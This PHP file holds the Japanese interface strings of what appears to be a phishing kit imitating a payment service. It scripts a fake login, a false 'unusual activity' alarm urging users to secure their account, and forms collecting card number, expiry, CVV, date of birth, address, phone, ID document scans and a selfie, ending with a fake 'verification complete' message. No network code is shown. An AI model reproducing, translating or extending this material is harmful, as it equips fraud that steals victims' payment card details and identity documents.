<?php

	$lg_sign = [
		"title" => "アカウントへのログイン",
		"alert" => "入力された情報を確認し、もう一度お試しください。",
		"changer" => "変更",
		"eml_placeholder" => "メールアドレス",
		"eml_msg1" => "必須",
		"eml_msg2" => "正しいメールアドレスが入力されていないようです。ご確認のうえ、もう一度お試しください。",
		"bt_next" => "次へ",
		"pwd_placeholder" => "パスワードを入力してください",
		"pwd_show" => "表示",
		"pwd_hide" => "非表示",
		"bt_login" => "ログイン",
		"trouble" => "ログインできない場合",
		"or" => "または",
		"bt_signup" => "新規登録",
		"footer" => [
			"contact" => "お問い合わせ",
			"privacy" => "プライバシー",
			"legal" => "法的",
			"world" => "国際"
		],
		"rotate" => "処理..."
	];

	$lg_activity = [
		"title" => "異常な活動",
		"head" => "我々はいくつかの異常な活動を気づきました",
		"body" => "不正なアクセスを防ぐためにアカウントを保護する必要があります。 あなたの安全のために、情報が正しくない場合、あなたのアカウントにいくつかの制限があるかもしれません",
		"bt_secure" => "アカウントを保護する"
	];

	$lg_process = [
		"title" => "マイアカウント",
		"logout" => "ログアウト",
		"menu" => [
			"home" => "概要",
			"activity" => "アクティビティ",
			"send_receive" => "送信＆リクエスト",
			"wallet" => "財布",
			"help" => "助けて",
			"open" => "メニュー",
			"close" => "閉じる"
		],
		"head1" => "あなたのカードを確認する",
		"head2" => "あなたのアドレスを確認",
		"ctype" => "カードの種類",
		"cnumber" => "カード番号",
		"exp" => "有効期限 MM/YY",
		"csc" => "CVV (3 桁)",
		"name" => "フルネーム",
		"dob" => "生年月日 (DD/MM/YYYY)",
		"address" => "住所ライン",
		"city" => "シティ / 村",
		"zip" => "郵便番号",
		"ptype" => "電話の種類",
		"pnumber" => "電話番号",
		"bt_save" => "セーブ",
		"footer" => [
			"security" => "セキュリティ",
			"rights" => "全著作権所有。"
		]
	];

	$lg_id = [
		"head" => "あなたのアイデンティティをアップロードする",
		"proof" => [
			"one" => "アイデンティティプルーフ",
			"two" => "証明付きセルフシー",
			"three" => "完了したプロセス"
		],
		"choose" => "あなたのIDの種類を選んでください",
		"type" => [
			"one" => "パスポート",
			"two" => "国民ID",
			"three" => "運転免許証"
		],
		"bt_proceed" => "続行する",
		"head_up" => "アップロードする",
		"rule1" => [
			"one" => "高品質の写真を撮るか、高品質のスキャンを行う",
			"two" => "両面原稿を両面印刷する",
			"three" => "パスポートを選択すると、両方のページをスキャンします"
		],
		"drop_zone" => "<b>" . "ドラッグアンドドロップまたはここをクリック" . "</b>" . "画像をアップロードする（最大5 MB）",
		"bt_back" => "戻る",
		"head_slf" => "セルフリーをアップロードする",
		"rule2" => [
			"one" => "あなたがカメラをまっすぐに見ていることを確認してください",
			"two" => "あなたの指は写真や重要な情報をカバーしていません",
			"three" => "帽子や眼鏡を着用しないでください。髭を整えてください"
		]
	];

	$lg_finish = [
		"head" => "検証プロセスが完了しました",
		"on" => "活性化された",
		"p1" => "購入保護は今です",
		"p2" => "アカウントが使用されているすべての適格購入、および当社のウェブサイトを通じて行われた支払いを対象としています。 購入保護を利用するためには、アカウントには良好な状態を保ち、購入または支払いから180日以内に紛争を提出することが義務付けられています。",
		"p3" => "購入保護の要件を読む"
	];

?>